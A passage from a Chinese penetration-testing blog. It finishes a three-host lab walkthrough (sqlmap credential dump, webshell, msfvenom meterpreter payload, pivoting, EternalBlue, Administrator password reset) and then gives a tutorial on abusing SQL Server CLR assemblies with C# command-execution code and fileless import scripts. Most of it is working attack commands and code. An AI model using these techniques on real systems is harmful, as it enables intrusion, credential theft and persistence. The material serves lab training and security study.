<p><img src="https://img-blog.csdnimg.cn/20201012214449225.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
7、username、password自然是最感兴趣的啦，给它dump下来，在dump的过程中sqlmap会有一些提示，一路yes就行</p>
<p><img src="https://img-blog.csdnimg.cn/2020101221450850.png#pic_center" alt="在这里插入图片描述"></p>
<pre><code class="prism language-c">root@kali<span class="token punctuation">:</span><span class="token operator">~</span># proxychains4 sqlmap <span class="token operator">-</span>u “http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">192.168</span><span class="token number">.22</span><span class="token number">.22</span><span class="token operator">/</span>index<span class="token punctuation">.</span>php<span class="token operator">?</span>r<span class="token operator">=</span>vul<span class="token operator">&amp;</span>keyword<span class="token operator">=</span><span class="token number">1</span>” <span class="token operator">-</span>p keyword <span class="token operator">-</span>D bagecms <span class="token operator">-</span>T bage_admin <span class="token operator">-</span>C username<span class="token punctuation">,</span>password –dump
</code></pre>
<p>8、找到我们想要的了，登陆后台，看看有哪些功能</p>
<p><img src="https://img-blog.csdnimg.cn/20201012214513840.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
9、后台里面有文件上传的地方，有编辑主页文件的地方，为了方便，我们直接把一句话写入网站文件中</p>
<p><img src="https://img-blog.csdnimg.cn/20201012214523524.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<img src="https://img-blog.csdnimg.cn/20201012214528944.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
10、来到标签页，可以看到一句话生效了，接下里在SocksCap中打开蚁剑，利用蚁剑连接，注意SocksCap设置好代理<br>
<img src="https://img-blog.csdnimg.cn/20201012214549821.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<img src="https://img-blog.csdnimg.cn/20201012214556750.png#pic_center" alt="在这里插入图片描述"></p>
<p><strong>b、设置代理</strong><br>
<br>
1、蚁剑中可以看到这是一个64位的linux系统，据此信息在MSF中生成后门</p>
<pre><code class="prism language-c">root@kali<span class="token punctuation">:</span><span class="token operator">~</span># msfvenom <span class="token operator">-</span>p linux<span class="token operator">/</span>x64<span class="token operator">/</span>meterpreter<span class="token operator">/</span>bind_tcp LPORT<span class="token operator">=</span><span class="token number">4321</span> <span class="token operator">-</span>f elf <span class="token operator">&gt;</span> shell2<span class="token punctuation">.</span>elf
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/2020101221461648.png#pic_center" alt="在这里插入图片描述"><br>
2、利用蚁剑将shell2.elf上传到Target2并开启监听</p>
<pre><code class="prism language-c"><span class="token punctuation">(</span>www<span class="token punctuation">:</span><span class="token operator">/</span>www<span class="token operator">/</span>wwwroot<span class="token operator">/</span>upload<span class="token punctuation">)</span> $ chmod <span class="token number">777</span> shell2<span class="token punctuation">.</span>elf
<span class="token punctuation">(</span>www<span class="token punctuation">:</span><span class="token operator">/</span>www<span class="token operator">/</span>wwwroot<span class="token operator">/</span>upload<span class="token punctuation">)</span> $ <span class="token punctuation">.</span><span class="token operator">/</span>shell2<span class="token punctuation">.</span>elf
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201012214638230.png#pic_center" alt="在这里插入图片描述"></p>
<p>3、在MSF中开启EXP，与Target2建立连接，这里需要注意，上一次代理使用的reversetcp是MSF作为监听，让Target1连到我们，而这次代理使用的bindtcp是Target2作为监听，我们需要连到Target2，这个逻辑正好是相反的。</p>
<pre><code class="prism language-c">msf5 <span class="token operator">&gt;</span> use exploit<span class="token operator">/</span>multi<span class="token operator">/</span>handler
msf5 <span class="token function">exploit</span><span class="token punctuation">(</span>multi<span class="token operator">/</span>handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> set payload linux<span class="token operator">/</span>x64<span class="token operator">/</span>meterpreter<span class="token operator">/</span>bind_tcp
msf5 <span class="token function">exploit</span><span class="token punctuation">(</span>multi<span class="token operator">/</span>handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> set RHOST <span class="token number">192.168</span><span class="token number">.22</span><span class="token number">.22</span>
msf5 <span class="token function">exploit</span><span class="token punctuation">(</span>multi<span class="token operator">/</span>handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> set LPORT <span class="token number">4321</span>
msf5 <span class="token function">exploit</span><span class="token punctuation">(</span>multi<span class="token operator">/</span>handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> options
msf5 <span class="token function">exploit</span><span class="token punctuation">(</span>multi<span class="token operator">/</span>handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> run
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201012214645416.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
4、与之前一样，我们添加Target3的路由，这里就不用设置代理了，直接添加路由即可</p>
<p><img src="https://img-blog.csdnimg.cn/20201012214657676.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<p>run autoroute -s 192.168.33.0/24<br>
run autoroute -p</p>
<p>5、尝试扫描Target3</p>
<p>root@kali:~# proxychains4 nmap -Pn -sT 192.168.33.33<br>
<img src="https://img-blog.csdnimg.cn/20201012214706618.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<hr>
<p><strong>0x03 Target3</strong></p>
<p>a、获取shell</p>
<p>1、从扫描的结果来看，不难看出这是一个开放着445、3389端口的Windows系统，那就先用永恒之蓝攻击试试</p>
<pre><code class="prism language-c">msf5 <span class="token operator">&gt;</span> use exploit<span class="token operator">/</span>windows<span class="token operator">/</span>smb<span class="token operator">/</span>ms17_010_psexec
msf5 <span class="token function">exploit</span><span class="token punctuation">(</span>windows<span class="token operator">/</span>smb<span class="token operator">/</span>ms17_010_psexec<span class="token punctuation">)</span> <span class="token operator">&gt;</span> set payload windows<span class="token operator">/</span>meterpreter<span class="token operator">/</span>bind_tcp
msf5 <span class="token function">exploit</span><span class="token punctuation">(</span>windows<span class="token operator">/</span>smb<span class="token operator">/</span>ms17_010_psexec<span class="token punctuation">)</span> <span class="token operator">&gt;</span> set RHOST <span class="token number">192.168</span><span class="token number">.33</span><span class="token number">.33</span>
msf5 <span class="token function">exploit</span><span class="token punctuation">(</span>windows<span class="token operator">/</span>smb<span class="token operator">/</span>ms17_010_psexec<span class="token punctuation">)</span> <span class="token operator">&gt;</span> options
msf5 <span class="token function">exploit</span><span class="token punctuation">(</span>windows<span class="token operator">/</span>smb<span class="token operator">/</span>ms17_010_psexec<span class="token punctuation">)</span> <span class="token operator">&gt;</span> run
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201012214813595.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
2、查看账户，直接修改账户密码，利用3389连接，注意要在SocksCap中运行连接远程桌面程序</p>
<pre><code class="prism language-c">meterpreter <span class="token operator">&gt;</span> shell
C<span class="token punctuation">:</span>\Windows\system32<span class="token operator">&gt;</span>net user
C<span class="token punctuation">:</span>\Windows\system32<span class="token operator">&gt;</span>net user Administrator <span class="token number">123</span>
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/2020101221482820.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<strong>0x04 总结</strong></p>
<p>到目前为止，三台靶机都已经拿下，这里推荐读者能够自己亲手尝试，找到里面的flag，其中所有flag的找寻方式，会在我的公众号“TeamsSix”推送，这里只讲述拿下三台靶机的方法。 这次的练习耗费了自己的大量时间，从靶场搭建到获取到第三层靶机的shell，这其中碰到的一些问题及我自己踩过的一些坑记录在下面：</p>
<p>1、蚁剑中查看一些文件会提示权限不足，在meterpreter中可以正常查看<br>
2、蚁剑中在Target2里执行命令或者查看文件时不时会失败，初步判断是因为本地网络代理的原因，多试几次就行，总有一次是成功的<br>
3、MSF中Socks5代理模块使用总是失败，Socks4a模块使用成功<br>
4、MSF中建立的会话总是自动断开，将会话连接的靶机上的防火墙关闭即可<br>
5、MSF中ms17010eternalblue模块利用总是失败，ms17010psexec模块使用成功<br>
6、meterpreter中查看文件的路径和Windows下文件的路径里的“/”是相反的<br>
7、meterpreter中上传文件大小貌似有限制，文件上传到8M左右就会提示失败，因此需要将文件压缩成多个小文件进行上传，同时上传7-zip工具（该工具只有1M大小），再利用7-zip对其解压即可，当然此方法仅适用于Windows，linux上的方法可以自行谷歌</p>
<p><strong>参考文章：</strong></p>
<pre><code class="prism language-c">http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>zerlong<span class="token punctuation">.</span>com<span class="token operator">/</span><span class="token number">512.</span>html

https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>www<span class="token punctuation">.</span>anquanke<span class="token punctuation">.</span>com<span class="token operator">/</span>post<span class="token operator">/</span>id<span class="token operator">/</span><span class="token number">170649</span>

https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>www<span class="token punctuation">.</span>anquanke<span class="token punctuation">.</span>com<span class="token operator">/</span>post<span class="token operator">/</span>id<span class="token operator">/</span><span class="token number">164525</span>

https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>blog<span class="token punctuation">.</span>csdn<span class="token punctuation">.</span>net<span class="token operator">/</span>qq_36711453<span class="token operator">/</span>article<span class="token operator">/</span>details<span class="token operator">/</span><span class="token number">84977739</span>
</code></pre>
<hr>
<h2><a id="1313__4750"></a>13.13 记一次简单的漏洞利用与横向</h2>
<p>这里不列举了，书上的内容不难，我也没写出来…<br>
下面分享一些SRC和一些非常好的实战文章…</p>
<pre><code class="prism language-c">https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>zhuanlan<span class="token punctuation">.</span>zhihu<span class="token punctuation">.</span>com<span class="token operator">/</span>p<span class="token operator">/</span><span class="token number">80448637</span>   <span class="token operator">--</span>全程带阻：记一次授权网络攻防演练

https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>xz<span class="token punctuation">.</span>aliyun<span class="token punctuation">.</span>com<span class="token operator">/</span>tab<span class="token operator">/</span><span class="token number">9</span><span class="token operator">?</span>page<span class="token operator">=</span><span class="token number">2</span>   <span class="token operator">--</span>渗透先知社区

https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>www<span class="token punctuation">.</span>chainnews<span class="token punctuation">.</span>com<span class="token operator">/</span>articles<span class="token operator">/</span><span class="token number">521963083705.</span>htm   <span class="token operator">--</span><span class="token operator">-</span>记一次授权网络攻防演练：屡败屡战的一次实战经历

https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>www<span class="token punctuation">.</span>anquanke<span class="token punctuation">.</span>com<span class="token operator">/</span>post<span class="token operator">/</span>id<span class="token operator">/</span><span class="token number">216682</span>   <span class="token operator">--</span><span class="token number">2020.9</span>月最新<span class="token operator">--</span>记一次实战过程中的漏洞挖掘过程

https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>zhuanlan<span class="token punctuation">.</span>kanxue<span class="token punctuation">.</span>com<span class="token operator">/</span>article<span class="token operator">-</span><span class="token number">8639.</span>htm   <span class="token operator">--</span>《<span class="token number">2019</span>补天白帽大会》——【Red Teaming 红队行动】分论坛 文字版实录


</code></pre>
<h2><a id="1314_CVE201912757_Symantec_Endpoint_Protection__4767"></a>13.14 CVE-2019-12757: Symantec Endpoint Protection 中的本地特权升级</h2>
<pre><code class="prism language-c">https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>posts<span class="token punctuation">.</span>specterops<span class="token punctuation">.</span>io<span class="token operator">/</span>cve<span class="token operator">-</span><span class="token number">2019</span><span class="token operator">-</span><span class="token number">12757</span><span class="token operator">-</span>local<span class="token operator">-</span>privilege<span class="token operator">-</span>escalation<span class="token operator">-</span>in<span class="token operator">-</span>symantec<span class="token operator">-</span>endpoint<span class="token operator">-</span>protection<span class="token operator">-</span><span class="token number">1f</span><span class="token number">7f</span>d5c859c6
国外的文章，写得非常好<span class="token operator">~</span><span class="token operator">~</span>
</code></pre>
<pre><code class="prism language-c">https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>cloud<span class="token punctuation">.</span>tencent<span class="token punctuation">.</span>com<span class="token operator">/</span>developer<span class="token operator">/</span>article<span class="token operator">/</span><span class="token number">1672114</span>   <span class="token operator">--</span>CVE<span class="token operator">-</span><span class="token number">2019</span><span class="token operator">-</span><span class="token number">0708</span> 本地复现
</code></pre>
<hr>
<h2><a id="1315_SQL_Server_CLR_4779"></a>13.15 攻击SQL Server CLR程序集</h2>
<p>在这个博客中，我会扩展Nathan Kirk博客CLR系列的CLR组件攻击。 我将介绍如何创建，导入，导出和修改SQL Server中的CLR程序集，以达到提升权限，执行系统命令和持久性等目的。我还将分享一些使用PowerUpSQL在Active Directory环境中更大规模执行(批量)CLR攻击的技巧。</p>
<p><strong>什么是SQL Server中的自定义CLR程序集？</strong></p>
<p>为了这个博客可以更好的说明，我们将定义一个公共语言运行库（CLR）组件作为一个.NET的DLL（或一组DLL）可以导入到SQL服务器。一旦导入，DLL方法就可以链接到存储过程，并通过TSQL执行。创建和导入自定义CLR程序集的能力是开发人员扩展SQL Server本地功能的一个很好的方式，但自然也为攻击者创造了机会。</p>
<p><strong>如何为SQL Server定制一个自定义的CLR DLL?</strong></p>
<p>下面是根据Nathan Kirk的操作和一些文章实现的利用微软C#执行系统命令的示例。你可以根据需要对代码作出修改，当你修改完毕后将文件保存至“c:tempcmd_exec.cs”。</p>
<pre><code class="prism language-c">using System<span class="token punctuation">;</span>
using System<span class="token punctuation">.</span>Data<span class="token punctuation">;</span>
using System<span class="token punctuation">.</span>Data<span class="token punctuation">.</span>SqlClient<span class="token punctuation">;</span>
using System<span class="token punctuation">.</span>Data<span class="token punctuation">.</span>SqlTypes<span class="token punctuation">;</span>
using Microsoft<span class="token punctuation">.</span>SqlServer<span class="token punctuation">.</span>Server<span class="token punctuation">;</span>
using System<span class="token punctuation">.</span>IO<span class="token punctuation">;</span>
using System<span class="token punctuation">.</span>Diagnostics<span class="token punctuation">;</span>
using System<span class="token punctuation">.</span>Text<span class="token punctuation">;</span>
public partial class StoredProcedures
<span class="token punctuation">{</span>
    <span class="token punctuation">[</span>Microsoft<span class="token punctuation">.</span>SqlServer<span class="token punctuation">.</span>Server<span class="token punctuation">.</span>SqlProcedure<span class="token punctuation">]</span>
    public <span class="token keyword">static</span> <span class="token keyword">void</span> cmd_exec <span class="token punctuation">(</span>SqlString execCommand<span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        Process proc <span class="token operator">=</span> new <span class="token function">Process</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        proc<span class="token punctuation">.</span>StartInfo<span class="token punctuation">.</span>FileName <span class="token operator">=</span> @<span class="token string">"C:WindowsSystem32cmd.exe"</span><span class="token punctuation">;</span>
        proc<span class="token punctuation">.</span>StartInfo<span class="token punctuation">.</span>Arguments <span class="token operator">=</span> string<span class="token punctuation">.</span><span class="token function">Format</span><span class="token punctuation">(</span>@<span class="token string">" /C {0}"</span><span class="token punctuation">,</span> execCommand<span class="token punctuation">.</span>Value<span class="token punctuation">)</span><span class="token punctuation">;</span>
        proc<span class="token punctuation">.</span>StartInfo<span class="token punctuation">.</span>UseShellExecute <span class="token operator">=</span> false<span class="token punctuation">;</span>
        proc<span class="token punctuation">.</span>StartInfo<span class="token punctuation">.</span>RedirectStandardOutput <span class="token operator">=</span> true<span class="token punctuation">;</span>
        proc<span class="token punctuation">.</span><span class="token function">Start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">// Create the record and specify the metadata for the columns.</span>
        SqlDataRecord record <span class="token operator">=</span> new <span class="token function">SqlDataRecord</span><span class="token punctuation">(</span>new <span class="token function">SqlMetaData</span><span class="token punctuation">(</span><span class="token string">"output"</span><span class="token punctuation">,</span> SqlDbType<span class="token punctuation">.</span>NVarChar<span class="token punctuation">,</span> <span class="token number">4000</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        
        <span class="token comment">// Mark the beginning of the result set.</span>
        SqlContext<span class="token punctuation">.</span>Pipe<span class="token punctuation">.</span><span class="token function">SendResultsStart</span><span class="token punctuation">(</span>record<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">// Set values for each column in the row</span>
        record<span class="token punctuation">.</span><span class="token function">SetString</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> proc<span class="token punctuation">.</span>StandardOutput<span class="token punctuation">.</span><span class="token function">ReadToEnd</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">ToString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">// Send the row back to the client.</span>
        SqlContext<span class="token punctuation">.</span>Pipe<span class="token punctuation">.</span><span class="token function">SendResultsRow</span><span class="token punctuation">(</span>record<span class="token punctuation">)</span><span class="token punctuation">;</span>
        
        <span class="token comment">// Mark the end of the result set.</span>
        SqlContext<span class="token punctuation">.</span>Pipe<span class="token punctuation">.</span><span class="token function">SendResultsEnd</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        
        proc<span class="token punctuation">.</span><span class="token function">WaitForExit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        proc<span class="token punctuation">.</span><span class="token function">Close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>
</code></pre>
<p>现在我们使用csc.exe将“c:tempcmd_exec.cs”编译成dll。在默认情况下即使你没有安装Visual Studio,csc.exe编译器是附带.NET框架的，我们使用下面的PowerShell命令来找到它。</p>
<pre><code class="prism language-c">Get<span class="token operator">-</span>ChildItem <span class="token operator">-</span>Recurse <span class="token string">"C:WindowsMicrosoft.NET"</span> <span class="token operator">-</span>Filter <span class="token string">"csc.exe"</span> <span class="token operator">|</span> Sort<span class="token operator">-</span>Object fullname <span class="token operator">-</span>Descending <span class="token operator">|</span> Select<span class="token operator">-</span>Object fullname <span class="token operator">-</span>First <span class="token number">1</span> <span class="token operator">-</span>ExpandProperty fullname
</code></pre>
<p>如果你找到了csc.exe，你可以使用下面的命令将“c:tempcmd_exec.cs”编译成dll文件。</p>
<pre><code class="prism language-c">C<span class="token punctuation">:</span>WindowsMicrosoft<span class="token punctuation">.</span>NETFramework64v4<span class="token punctuation">.</span><span class="token number">0.30319</span>csc<span class="token punctuation">.</span>exe <span class="token operator">/</span>target<span class="token punctuation">:</span>library c<span class="token punctuation">:</span>tempcmd_exec<span class="token punctuation">.</span>cs
</code></pre>
<p><strong>如何导入我的CLR DLL到SQL Server？</strong></p>
<p>要将dll导入SqlServer，需要SQL登录的权限为sysadmin，有CREATE ASSEMBLY权限或ALTER ASSEMBLY权限。然后按照以下步骤注册dll并且将其链接到存储过程，以便使用TSQL执行cmd_exec方法。</p>
<p>以sysadmin身份登录到SqlServer，并用下面TSQL查询：</p>
<pre><code class="prism language-c"><span class="token operator">--</span> Select the msdb database
use msdb
<span class="token operator">--</span> Enable show advanced options on the server
sp_configure <span class="token string">'show advanced options'</span><span class="token punctuation">,</span><span class="token number">1</span>
RECONFIGURE
GO
<span class="token operator">--</span> Enable clr on the server
sp_configure <span class="token string">'clr enabled'</span><span class="token punctuation">,</span><span class="token number">1</span>
RECONFIGURE
GO
<span class="token operator">--</span> Import the assembly
CREATE ASSEMBLY my_assembly
FROM <span class="token string">'c:tempcmd_exec.dll'</span>
WITH PERMISSION_SET <span class="token operator">=</span> UNSAFE<span class="token punctuation">;</span>
<span class="token operator">--</span> Link the assembly to a stored procedure
CREATE PROCEDURE <span class="token punctuation">[</span>dbo<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token punctuation">[</span>cmd_exec<span class="token punctuation">]</span> @execCommand NVARCHAR <span class="token punctuation">(</span><span class="token number">4000</span><span class="token punctuation">)</span> AS EXTERNAL NAME <span class="token punctuation">[</span>my_assembly<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token punctuation">[</span>StoredProcedures<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token punctuation">[</span>cmd_exec<span class="token punctuation">]</span><span class="token punctuation">;</span>
GO
</code></pre>
<p>现在，你应该可以通过“msdb”数据库中的“cmd_exec”存储过程执行系统命令了，如下面的示例所示。</p>
<p><img src="https://img-blog.csdnimg.cn/20201012221056685.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
完成后你可以使用下面的sql语句删掉该过程和程序集</p>
<p><strong>如何将我的CLR DLL转换成一个十六进制字符串并在没有文件的情况下导入它?</strong></p>
<p>CLR程序集导入SQLServer时不必一定要引用一个dll文件，“CREATE ASSEMBLY”也接受一个十六进制的字符串表示CLR DLL文件。下面是一个PowerShell脚本示例，演示了如何将你的“cmd_exec.dll”文件转换到sql命令中，它可以用来创建没有物理文件引用的程序集。</p>
<pre><code class="prism language-c"><span class="token macro property"># Target file</span>
$assemblyFile <span class="token operator">=</span> <span class="token string">"c:tempcmd_exec.dll"</span>
<span class="token macro property"># Build top of TSQL CREATE ASSEMBLY statement</span>
$stringBuilder <span class="token operator">=</span> New<span class="token operator">-</span>Object <span class="token operator">-</span>Type System<span class="token punctuation">.</span>Text<span class="token punctuation">.</span>StringBuilder 
$stringBuilder<span class="token punctuation">.</span><span class="token function">Append</span><span class="token punctuation">(</span><span class="token string">"CREATE ASSEMBLY [my_assembly] AUTHORIZATION [dbo] FROM `n0x"</span><span class="token punctuation">)</span> <span class="token operator">|</span> Out<span class="token operator">-</span>Null
<span class="token macro property"># Read bytes from file</span>
$fileStream <span class="token operator">=</span> <span class="token punctuation">[</span>IO<span class="token punctuation">.</span>File<span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">OpenRead</span><span class="token punctuation">(</span>$assemblyFile<span class="token punctuation">)</span>
<span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>$byte <span class="token operator">=</span> $fileStream<span class="token punctuation">.</span><span class="token function">ReadByte</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span>gt <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    $stringBuilder<span class="token punctuation">.</span><span class="token function">Append</span><span class="token punctuation">(</span>$byte<span class="token punctuation">.</span><span class="token function">ToString</span><span class="token punctuation">(</span><span class="token string">"X2"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">|</span> Out<span class="token operator">-</span>Null
<span class="token punctuation">}</span>
<span class="token macro property"># Build bottom of TSQL CREATE ASSEMBLY statement</span>
$stringBuilder<span class="token punctuation">.</span><span class="token function">AppendLine</span><span class="token punctuation">(</span><span class="token string">"`nWITH PERMISSION_SET = UNSAFE"</span><span class="token punctuation">)</span> <span class="token operator">|</span> Out<span class="token operator">-</span>Null
$stringBuilder<span class="token punctuation">.</span><span class="token function">AppendLine</span><span class="token punctuation">(</span><span class="token string">"GO"</span><span class="token punctuation">)</span> <span class="token operator">|</span> Out<span class="token operator">-</span>Null
$stringBuilder<span class="token punctuation">.</span><span class="token function">AppendLine</span><span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">)</span> <span class="token operator">|</span> Out<span class="token operator">-</span>Null
<span class="token macro property"># Build create procedure command</span>
$stringBuilder<span class="token punctuation">.</span><span class="token function">AppendLine</span><span class="token punctuation">(</span><span class="token string">"CREATE PROCEDURE [dbo].[cmd_exec] @execCommand NVARCHAR (4000) AS EXTERNAL NAME [my_assembly].[StoredProcedures].[cmd_exec];"</span><span class="token punctuation">)</span> <span class="token operator">|</span> Out<span class="token operator">-</span>Null
$stringBuilder<span class="token punctuation">.</span><span class="token function">AppendLine</span><span class="token punctuation">(</span><span class="token string">"GO"</span><span class="token punctuation">)</span> <span class="token operator">|</span> Out<span class="token operator">-</span>Null
$stringBuilder<span class="token punctuation">.</span><span class="token function">AppendLine</span><span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">)</span> <span class="token operator">|</span> Out<span class="token operator">-</span>Null
<span class="token macro property"># Create run os command</span>
$stringBuilder<span class="token punctuation">.</span><span class="token function">AppendLine</span><span class="token punctuation">(</span><span class="token string">"EXEC[dbo].[cmd_exec] 'whoami'"</span><span class="token punctuation">)</span> <span class="token operator">|</span> Out<span class="token operator">-</span>Null
$stringBuilder<span class="token punctuation">.</span><span class="token function">AppendLine</span><span class="token punctuation">(</span><span class="token string">"GO"</span><span class="token punctuation">)</span> <span class="token operator">|</span> Out<span class="token operator">-</span>Null
$stringBuilder<span class="token punctuation">.</span><span class="token function">AppendLine</span><span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">)</span> <span class="token operator">|</span> Out<span class="token operator">-</span>Null
<span class="token macro property"># Create file containing all commands</span>
$stringBuilder<span class="token punctuation">.</span><span class="token function">ToString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span>join <span class="token string">""</span> <span class="token operator">|</span> Out<span class="token operator">-</span>File c<span class="token punctuation">:</span>tempcmd_exec<span class="token punctuation">.</span>txt
</code></pre>
<p>如果一切顺利“c:tempcmd_exec.txt”文件应该包含以下SQL语句。在该示例中，十六进制字符串已被截断，但是你的长度应该更长</p>
<pre><code class="prism language-c"><span class="token operator">--</span> Select the MSDB database
USE msdb
<span class="token operator">--</span> Enable clr on the server
Sp_Configure <span class="token string">'clr enabled'</span><span class="token punctuation">,</span> <span class="token number">1</span>
RECONFIGURE
GO
<span class="token operator">--</span> Create assembly from ascii hex
CREATE ASSEMBLY <span class="token punctuation">[</span>my_assembly<span class="token punctuation">]</span> AUTHORIZATION <span class="token punctuation">[</span>dbo<span class="token punctuation">]</span> FROM 
<span class="token number">0x4D5A90000300000004000000F</span><span class="token punctuation">[</span>TRUNCATED<span class="token punctuation">]</span>
WITH PERMISSION_SET <span class="token operator">=</span> UNSAFE 
GO 
<span class="token operator">--</span> Create procedures from the assembly method cmd_exec
CREATE PROCEDURE <span class="token punctuation">[</span>dbo<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token punctuation">[</span>my_assembly<span class="token punctuation">]</span> @execCommand NVARCHAR <span class="token punctuation">(</span><span class="token number">4000</span><span class="token punctuation">)</span> AS EXTERNAL NAME <span class="token punctuation">[</span>cmd_exec<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token punctuation">[</span>StoredProcedures<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token punctuation">[</span>cmd_exec<span class="token punctuation">]</span><span class="token punctuation">;</span> 
GO 
<span class="token operator">--</span> Run an OS command as the SQL Server service account
EXEC<span class="token punctuation">[</span>dbo<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token punctuation">[</span>cmd_exec<span class="token punctuation">]</span> <span class="token string">'whoami'</span> 
GO
</code></pre>
<p>当你用sysadmin权限在SqlServer中运行“c:tempcmd_exec.txt”的sql语句时，输出应该如下所示：</p>
<p><img src="https://img-blog.csdnimg.cn/20201012221145834.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
PowerUpSQL自动化</p>
<p>你可以在使用PowerUpSQL之前，访问此<a href="https://github.com/NetSPI/PowerUpSQL/wiki">链接了解PowerUpSQL</a></p>
